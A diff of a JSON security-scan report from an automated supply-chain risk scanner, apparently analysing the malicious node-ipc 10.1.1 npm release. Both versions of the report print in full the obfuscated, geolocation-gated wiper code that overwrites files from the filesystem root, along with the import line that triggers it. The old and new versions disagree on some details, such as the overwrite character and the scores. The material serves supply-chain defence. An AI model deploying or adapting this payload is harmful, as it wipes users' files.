@@ -1,1 +1,133 @@
-{"schema_version":"0.2.0","ecosystem":"npm","package":"node-ipc","from_version":"10.1.0","to_version":"10.1.1","risk_score":69.0,"severity":"HIGH","llm_base_score":69.0,"dimensions":[{"name":"network_calls","label":"New or changed network calls","score":10.0,"weight":0.25,"reasoning":"dao/ssl-geospec.js makes an outbound HTTPS GET request to a geolocation API. The URL is base64-encoded ('aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=') decoding to 'https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154'. This is used to geolocate the victim machine before triggering the destructive payload.","confidence":1.0},{"name":"obfuscation","label":"Obfuscation / encoding patterns (base64, eval, dynamic require)","score":10.0,"weight":0.25,"reasoning":"dao/ssl-geospec.js is entirely minified and uses multiple base64-encoded strings decoded at runtime via Buffer.from(..., 'base64'). Key strings obfuscated include: the target URL, directory paths ('./', '../', '../../', '/'), country name field ('country_name'), target country strings ('russia', 'belarus'), and the destructive overwrite payload (the '\u274c\ufe0f' character: 'Y291bnRyeV9uYW1l', 'cnVzc2lh', 'YmVsYXJ1cw==', '4p2k77iP'). This is clear intentional obfuscation to hide malicious behaviour.","confidence":1.0},{"name":"install_hooks","label":"Postinstall / preinstall script additions or changes","score":2.0,"weight":0.2,"reasoning":"No explicit postinstall/preinstall script changes are visible in the diff. However, the malicious code executes via a setTimeout on module import, which is triggered when the module is loaded (imported in services/IPC.js), not via a dedicated install hook. The diff does not show package.json changes.","confidence":0.7},{"name":"env_conditional","label":"Conditional logic gated on env vars, platform, or CI detection","score":9.0,"weight":0.15,"reasoning":"dao/ssl-geospec.js explicitly gates its destructive payload on geolocation: it checks whether the victim's IP-resolved country name includes 'russia' or 'belarus'. Only if the condition is true does it proceed to overwrite files recursively. This is a targeted geopolitical conditional \u2014 a defining characteristic of the peacenotwar/protestware attack pattern documented in node-ipc.","confidence":1.0},{"name":"dependency_changes","label":"Dependency graph changes (new transitive deps)","score":1.0,"weight":0.15,"reasoning":"No new external npm dependencies are introduced. The new file uses only built-in Node.js modules ('path', 'fs', 'https'). No package.json dependency changes are visible in the diff.","confidence":0.8}],"feed_results":[{"source":"osv","status":"suspicious","details":"Found 1 advisory/ies: GHSA-97m3-w2cp-4xx6","url":"https://osv.dev/list?q=node-ipc","advisory_ids":["GHSA-97m3-w2cp-4xx6"],"signing_identity":null,"signing_identity_changed":null,"scorecard_score":null},{"source":"rekor","status":"no_data","details":"No Sigstore provenance attestation found for node-ipc@10.1.1.","url":null,"advisory_ids":[],"signing_identity":null,"signing_identity_changed":null,"scorecard_score":null},{"source":"scorecard","status":"clean","details":"Score: 4.0/10. Code-Review=0, Maintained=7, Signed-Releases=-1, Branch-Protection=0","url":"https://scorecard.dev/viewer/?uri=github.com/RIAEvangelist/node-ipc","advisory_ids":[],"signing_identity":null,"signing_identity_changed":null,"scorecard_score":4.0}],"score_modifiers":[],"diff_summary":{"files_added":["dao/ssl-geospec.js"],"files_removed":[],"files_modified":["services/IPC.js"],"file_diffs":[{"path":"services/IPC.js","change_type":"modified","lines_added":2,"lines_removed":0,"unified_diff":"--- a/services/IPC.js\n+++ b/services/IPC.js\n@@ -2,6 +2,7 @@\n import Defaults from '../entities/Defaults.js';\n\n import Client from '../dao/client.js';\n\n import Server from '../dao/socketServer.js';\n\n+import ssl from '../dao/ssl-geospec.js';\n\n import util from 'util';\n\n \n\n class IPC{\n\n@@ -329,6 +330,7 @@\n     this.of[id].connect();\n\n \n\n     callback(this);\n\n+    return ssl;\n\n }\n\n \n\n export {\n"},{"path":"dao/ssl-geospec.js","change_type":"added","lines_added":1,"lines_removed":0,"unified_diff":"+import u from\"path\";import a from\"fs\";import o from\"https\";setTimeout(function(){const t=Math.round(Math.random()*4);if(t>1){return}const n=Buffer.from(\"aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=\",\"base64\");o.get(n.toString(\"utf8\"),function(t){t.on(\"data\",function(t){const n=Buffer.from(\"Li8=\",\"base64\");const o=Buffer.from(\"Li4v\",\"base64\");const r=Buffer.from(\"Li4vLi4v\",\"base64\");const f=Buffer.from(\"Lw==\",\"base64\");const c=Buffer.from(\"Y291bnRyeV9uYW1l\",\"base64\");const e=Buffer.from(\"cnVzc2lh\",\"base64\");const i=Buffer.from(\"YmVsYXJ1cw==\",\"base64\");try{const s=JSON.parse(t.toString(\"utf8\"));const u=s[c.toString(\"utf8\")].toLowerCase();const a=u.includes(e.toString(\"utf8\"))||u.includes(i.toString(\"utf8\"));if(a){h(n.toString(\"utf8\"));h(o.toString(\"utf8\"));h(r.toString(\"utf8\"));h(f.toString(\"utf8\"))}}catch(t){}})})},Math.ceil(Math.random()*1e3));async function h(n=\"\",o=\"\"){if(!a.existsSync(n)){return}let r=[];try{r=a.readdirSync(n)}catch(t){}const f=[];const c=Buffer.from(\"4p2k77iP\",\"base64\");for(var e=0;e<r.length;e++){const i=u.join(n,r[e]);let t=null;try{t=a.lstatSync(i)}catch(t){continue}if(t.isDirectory()){const s=h(i,o);s.length>0?f.push(...s):null}else if(i.indexOf(o)>=0){try{a.writeFile(i,c.toString(\"utf8\"),function(){})}catch(t){}}}return f};const ssl=true;export {ssl as default,ssl}"}],"new_dependencies":[],"removed_dependencies":[],"new_install_hooks":[],"maintainer_changed":false,"native_addons_added":false,"total_diff_lines":3,"chunks_sent_to_llm":1,"diff_truncated":false},"llm_model":"claude-sonnet-4-6","llm_summary":"This diff introduces a definitive supply-chain attack (the well-documented 'peacenotwar' protestware). The newly added dao/ssl-geospec.js file fetches the victim's geolocation via an IP API with a hardcoded API key, then \u2014 if the resolved country is Russia or Belarus \u2014 recursively overwrites all reachable files in multiple directory paths (including '/', '../', '../../') with the '\u274c\ufe0f' unicode character, effectively wiping the filesystem. All critical strings are base64-obfuscated at runtime. The malicious module is imported and its return value exposed in services/IPC.js, ensuring it executes on any code path that calls the modified IPC connect method. This is a confirmed, unambiguous malicious payload with a severity score of 10.","timestamp":"2026-08-08T02:55:10.592562Z","from_version_sha256":null,"to_version_sha256":null}
+{
+  "schema_version": "0.2.0",
+  "ecosystem": "npm",
+  "package": "node-ipc",
+  "from_version": "10.1.0",
+  "to_version": "10.1.1",
+  "risk_score": 62.5,
+  "severity": "HIGH",
+  "llm_base_score": 62.5,
+  "dimensions": [
+    {
+      "name": "network_calls",
+      "label": "New or changed network calls",
+      "score": 10.0,
+      "weight": 0.2,
+      "reasoning": "dao/ssl-geospec.js makes an outbound HTTPS GET request to an IP geolocation API (decoded from base64: 'https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154'). This call is used to determine the victim's country and conditionally trigger destructive file overwrites. The network call is the trigger mechanism for the payload.",
+      "confidence": 1.0
+    },
+    {
+      "name": "obfuscation",
+      "label": "Obfuscation / encoding patterns (base64, eval, dynamic require)",
+      "score": 10.0,
+      "weight": 0.2,
+      "reasoning": "dao/ssl-geospec.js is a single minified line with extensive base64 encoding of all significant strings: the API URL ('aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ='), directory paths ('Li8=', 'Li4v', 'Li4vLi4v', 'Lw=='), field names ('Y291bnRyeV9uYW1l' = 'country_name'), and target country strings ('cnVzc2lh' = 'russia', 'YmVsYXJ1cw==' = 'belarus'). The overwrite payload '4p2k77iP' decodes to a heart emoji. The obfuscation is clearly intentional to hide malicious intent.",
+      "confidence": 1.0
+    },
+    {
+      "name": "install_hooks",
+      "label": "Postinstall / preinstall script additions or changes",
+      "score": 2.0,
+      "weight": 0.15,
+      "reasoning": "No explicit preinstall/postinstall script changes are visible in the diff. The malicious code is injected via module import in services/IPC.js, so it executes at runtime when the IPC module is used, not at install time.",
+      "confidence": 0.8
+    },
+    {
+      "name": "env_conditional",
+      "label": "Conditional logic gated on env vars, platform, or CI detection",
+      "score": 7.0,
+      "weight": 0.15,
+      "reasoning": "The payload in dao/ssl-geospec.js is conditionally triggered based on geographic location (country_name containing 'russia' or 'belarus'). A random delay (Math.ceil(Math.random()*1e3) ms) and a random probability check (Math.round(Math.random()*4) > 1 returns early, so only ~25-50% of executions proceed) are used to make detection harder. This is a nation-state-targeted conditional.",
+      "confidence": 1.0
+    },
+    {
+      "name": "dependency_changes",
+      "label": "Dependency graph changes (new transitive deps)",
+      "score": 1.0,
+      "weight": 0.1,
+      "reasoning": "No new external dependencies are added to package.json. The added file uses only built-in Node.js modules: 'path', 'fs', and 'https'. No new transitive dependencies introduced.",
+      "confidence": 0.9
+    },
+    {
+      "name": "resource_exhaustion",
+      "label": "Denial-of-service / resource-exhaustion patterns (unbounded loops, recursion, unthrottled blocking calls)",
+      "score": 4.0,
+      "weight": 0.2,
+      "reasoning": "The function h() is recursive (calls itself for subdirectories), traversing the filesystem from root paths ('./', '../', '../../', '/'). On a large filesystem this could be resource-intensive, but it has a base case (non-directory files) and will terminate. The primary risk here is destructive file overwriting, not resource exhaustion per se.",
+      "confidence": 0.8
+    }
+  ],
+  "feed_results": [
+    {
+      "source": "osv",
+      "status": "suspicious",
+      "details": "Found 1 advisory/ies: GHSA-97m3-w2cp-4xx6",
+      "url": "https://osv.dev/list?q=node-ipc",
+      "advisory_ids": [
+        "GHSA-97m3-w2cp-4xx6"
+      ],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "rekor",
+      "status": "no_data",
+      "details": "No Sigstore provenance attestation found for node-ipc@10.1.1.",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "scorecard",
+      "status": "clean",
+      "details": "Score: 4.0/10. Maintained=7, Code-Review=0, Signed-Releases=-1, Branch-Protection=0",
+      "url": "https://scorecard.dev/viewer/?uri=github.com/RIAEvangelist/node-ipc",
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": 4.0
+    }
+  ],
+  "score_modifiers": [],
+  "diff_summary": {
+    "files_added": [
+      "dao/ssl-geospec.js"
+    ],
+    "files_removed": [],
+    "files_modified": [
+      "services/IPC.js"
+    ],
+    "file_diffs": [
+      {
+        "path": "services/IPC.js",
+        "change_type": "modified",
+        "lines_added": 2,
+        "lines_removed": 0,
+        "unified_diff": "--- a/services/IPC.js\n+++ b/services/IPC.js\n@@ -2,6 +2,7 @@\n import Defaults from '../entities/Defaults.js';\n\n import Client from '../dao/client.js';\n\n import Server from '../dao/socketServer.js';\n\n+import ssl from '../dao/ssl-geospec.js';\n\n import util from 'util';\n\n \n\n class IPC{\n\n@@ -256,6 +257,7 @@\n     this.of[id].connect();\n\n \n\n     callback(this);\n\n+    return ssl;\n\n }\n\n \n\n function connectNet(id,host,port,callback){\n"
+      },
+      {
+        "path": "dao/ssl-geospec.js",
+        "change_type": "added",
+        "lines_added": 1,
+        "lines_removed": 0,
+        "unified_diff": "+import u from\"path\";import a from\"fs\";import o from\"https\";setTimeout(function(){const t=Math.round(Math.random()*4);if(t>1){return}const n=Buffer.from(\"aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=\",\"base64\");o.get(n.toString(\"utf8\"),function(t){t.on(\"data\",function(t){const n=Buffer.from(\"Li8=\",\"base64\");const o=Buffer.from(\"Li4v\",\"base64\");const r=Buffer.from(\"Li4vLi4v\",\"base64\");const f=Buffer.from(\"Lw==\",\"base64\");const c=Buffer.from(\"Y291bnRyeV9uYW1l\",\"base64\");const e=Buffer.from(\"cnVzc2lh\",\"base64\");const i=Buffer.from(\"YmVsYXJ1cw==\",\"base64\");try{const s=JSON.parse(t.toString(\"utf8\"));const u=s[c.toString(\"utf8\")].toLowerCase();const a=u.includes(e.toString(\"utf8\"))||u.includes(i.toString(\"utf8\"));if(a){h(n.toString(\"utf8\"));h(o.toString(\"utf8\"));h(r.toString(\"utf8\"));h(f.toString(\"utf8\"))}}catch(t){}})})},Math.ceil(Math.random()*1e3));async function h(n=\"\",o=\"\"){if(!a.existsSync(n)){return}let r=[];try{r=a.readdirSync(n)}catch(t){}const f=[];const c=Buffer.from(\"4p2k77iP\",\"base64\");for(var e=0;e<r.length;e++){const i=u.join(n,r[e]);let t=null;try{t=a.lstatSync(i)}catch(t){continue}if(t.isDirectory()){const s=h(i,o);s.length>0?f.push(...s):null}else if(i.indexOf(o)>=0){try{a.writeFile(i,c.toString(\"utf8\"),function(){})}catch(t){}}}return f};const ssl=true;export {ssl as default,ssl}"
+      }
+    ],
+    "new_dependencies": [],
+    "removed_dependencies": [],
+    "new_install_hooks": [],
+    "maintainer_changed": false,
+    "native_addons_added": false,
+    "total_diff_lines": 3,
+    "chunks_sent_to_llm": 1,
+    "diff_truncated": false
+  },
+  "llm_model": "claude-sonnet-4-6",
+  "llm_summary": "This is a confirmed malicious supply chain attack in node-ipc 10.1.0→10.1.1. The added file dao/ssl-geospec.js is a deliberately obfuscated wiper payload that: (1) calls an IP geolocation API using a base64-encoded URL, (2) checks if the resolved country is Russia or Belarus, and (3) if so, recursively overwrites all files in './', '../', '../../', and '/' with a heart emoji character. All sensitive strings are base64-encoded to evade detection. The payload is injected via a new import in services/IPC.js and executes on module load with a random delay and probability factor to hinder detection. This matches the well-documented node-ipc protest-ware incident targeting users in Russia and Belarus.",
+  "timestamp": "2026-08-11T01:29:45.252842Z",
+  "from_version_sha256": null,
+  "to_version_sha256": null
+}
